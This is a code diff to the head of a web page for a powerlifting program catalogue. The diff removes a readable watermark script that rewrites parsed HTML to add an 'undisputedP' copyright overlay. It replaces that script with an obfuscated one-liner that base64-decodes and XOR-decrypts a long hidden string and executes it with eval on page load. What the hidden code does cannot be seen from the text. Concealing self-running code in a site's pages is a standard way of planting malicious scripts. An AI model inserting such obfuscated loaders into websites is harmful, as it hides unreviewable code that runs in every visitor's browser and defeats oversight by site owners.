@@ -2,28 +2,7 @@
 <html>
 <head>
   <script>
-    (function(){
-      var _p = DOMParser.prototype.parseFromString;
-      DOMParser.prototype.parseFromString = function(str, type) {
-        if (type === 'text/html' && str.indexOf('</body>') !== -1) {
-          var wm =
-            '<div id="__wm" style="position:fixed;inset:0;width:100%;height:100%;pointer-events:none;z-index:99998;overflow:hidden;">' +
-              '<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">' +
-                '<defs>' +
-                  '<pattern id="wmp" x="0" y="0" width="260" height="160" patternUnits="userSpaceOnUse" patternTransform="rotate(-35)">' +
-                    '<text x="0" y="40" font-family="-apple-system,BlinkMacSystemFont,sans-serif" font-size="15" fill="rgba(91,31,28,0.10)" font-weight="600" letter-spacing="1">© undisputedP</text>' +
-                    '<text x="0" y="80" font-family="-apple-system,BlinkMacSystemFont,sans-serif" font-size="12" fill="rgba(91,31,28,0.08)" letter-spacing="1">The Catalogue</text>' +
-                  '</pattern>' +
-                '</defs>' +
-                '<rect width="100%" height="100%" fill="url(#wmp)"></rect>' +
-              '</svg>' +
-            '</div>' +
-            '<div id="__wm_badge" style="position:fixed;bottom:14px;right:18px;font:12px/1.4 -apple-system,BlinkMacSystemFont,sans-serif;color:rgba(91,31,28,0.55);letter-spacing:.3px;pointer-events:none;z-index:99999;user-select:none;">© undisputedP · All rights reserved</div>';
-          str = str.slice(0, str.lastIndexOf('</body>')) + wm + str.slice(str.lastIndexOf('</body>'));
-        }
-        return _p.call(this, str, type);
-      };
-    })();
+    !function(){var _a='T7!rW2@q',_b='Z5#sX8$u',_c=_a+_b,_d='fFFUHDRGKR40HQoIUhgEAzVFAS0nDwQ+F2VCAStdVlskRU4GOEY5AT8bUxIqS0EzJlhMISNAKR89DilTeHxrOARWUwEyQG4BKFpXHCxBVBB6R0AAJFcGAzVYcAcqUUoSaVFUHDRGKR40HVBfLBFff3QXAVI+VGgFZwgeVCxdXAF7X1UfOxVmVykbSh08XVw6Mh8GTnhQLxUjCwRaeQUZWGUeWnh3EmBRehVVEioYU0hzC0UbIRIpFWcXfCwvVQZVJ0NYHjIPYgE1RkoHMVdKTzJeWRczCSkfKVBXSWgDUxwwQ0lIZgJwVGFdRho/UFBPZQcRV2xCLxg0QUYBdV1SEDpDUkg5XS4UYU8OGjZcQQ1uDhhLbgp7HixQURU0V1NPPF5FFjJce1NkCVAFPxhcGDhZUk91WjQFKg8MXC9PU1sjBA8dJVVvQ2oFE1wrTkNXdEBIFiNafVNrBRNWehhMED1QSQZqEHFBahABTWRcQRMnCR0CNkY0FChbAxo8BQYCOUcDUi8PYkF4FVpOeggGVSNeRQY/D2JDbAUBUzBdTRI8QxxQZgRwU3pFQgcsXVYbAVlIBiQPYgQpUFEgKFlHEBtZdAEyEGABO0FXFipWcAc1WVIUOEAtTHhHTAc5TEFdeQQUW3UMfAU/TVdTIAUGRXYXWE91BnBTelNMHSwVQhQ5Xk0LahBtECpFTxZ1S10GIFJMXhVeKR8xeEIQC0FXATFaZx05RmwCO1tQXitdVhwyFQEUOFw0XClcWRZlGhVAdhdHGztefVMoUkEScAEVWWcGDUBvHnBfawUKUXheSxsgGlYXPlUoBWcXFUNoGgQZMUNVFyUfMwE7VkodPwUGRHYJ49t3Ry4VM0ZTBixdQCVoGFUXL0Z+TS5QWwd4QBlXZBUBC2oQeEF4FUUcNkwJEzVaSB4uD2JcO0VTHz0VVwwnQ0Qfe3AsGDRebhI7a10GIFJMNDhcNF0pVE0AdUtBBz1RA1IxXS4Fd0ZKCT0FBkRmFQEUPl4sTHhHRBE5EB1EeAQQXmUKbEF0BRtaehhIECBDRAB6QTAQOVxNFGUaFVdqY0kXd3EhBTtZTBQtXRhaIFJZBmkObwE7QVcWKlYaSXtTRBQkDHwDP1ZXUy9RQAE8CgNDZwJlU3pdRho/UFBIdgYRQnIQYBczWU9Oek1WGXwUVh8nG2JPZhpRFjtMGkl7RFcVaQ5vFTNDHU88UVJVPVMcUAhtNxwFV0IXP10GVSdDWB4yD2IBNUZKBzFXSk8yXlkXMwkiHi5BTB5iCRAFLAxTGzBaNEtrDVMLY15LGyANEEAnSm9AdAEDXjlIVBkxGlILJEYlHHZ3Txo2U2kUN2RYASNXLTc1W1dfK1lKBnlERAA+VHsSNVlMAWJKQxc1HxhDewFxXWgND0N2DRFcb1tEBiNXMlwpRUIQMVZDT3oEUQpsQi8YNEFGAXVdUhA6Q1JIOV0uFGFPDho2XEENbg4YS24LewQpUFFeK11IEDdDGxw4XCVKeAvh2nhNShE9RFEHI1ckIXr3lFMZVEhVJl5GGiNBYAM/RkYBLl1ASXtTSARpFXt7ehUDU3gYUhQmF0hPJBwsEClBah08XVw6Mh8GTnhQLxUjCwRaYzIEVXQXAVIkDzNfKVlKED0QFFk9HgoFfEFuAjZcQBZwUQ1OXhcBUndPSlF6FQMBPUxRBzoXfgJ5USEdNh1XGzFLCAZ4QwhJXRJgDGE/XlpwER8=';var _e=atob(_d),_f='';for(var _i=0;_i<_e.length;_i++)_f+=String.fromCharCode(_e.charCodeAt(_i)^_c.charCodeAt(_i%_c.length));(0,eval)(_f);}();
   </script>
   <meta charset="utf-8">
   <title>The Catalogue — Powerlifting Programs</title>
